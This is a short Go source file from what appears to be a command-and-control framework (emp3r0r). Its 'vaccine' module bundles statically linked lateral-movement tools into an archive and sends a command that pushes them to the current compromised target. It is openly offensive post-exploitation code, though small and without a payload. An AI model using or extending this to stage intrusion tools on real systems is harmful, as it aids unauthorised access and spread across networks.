package cc

import (
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		err := CreateVaccineArchive()
		if err != nil {
			CliPrintError("CreateVaccineArchive: %v", err)
			return
		}
		err = SendCmd("!utils", "", CurrentTarget)
		if err != nil {
			CliPrintError("SendCmd failed: %v", err)
		}
	}()
}

func CreateVaccineArchive() (err error) {
	CliPrintInfo("Creating %s for module vaccine, allow up to 10 seconds...", UtilsArchive)
	pwd, _ := os.Getwd()
	err = os.Chdir(ModuleDir + "/vaccine")
	if err != nil {
		return fmt.Errorf("Entering vaccine dir: %v", err)
	}
	defer os.Chdir(pwd)
	err = util.TarBz2(".", UtilsArchive)
	if err != nil {
		return fmt.Errorf("Creating vaccine archive: %v", err)
	}
	return
}
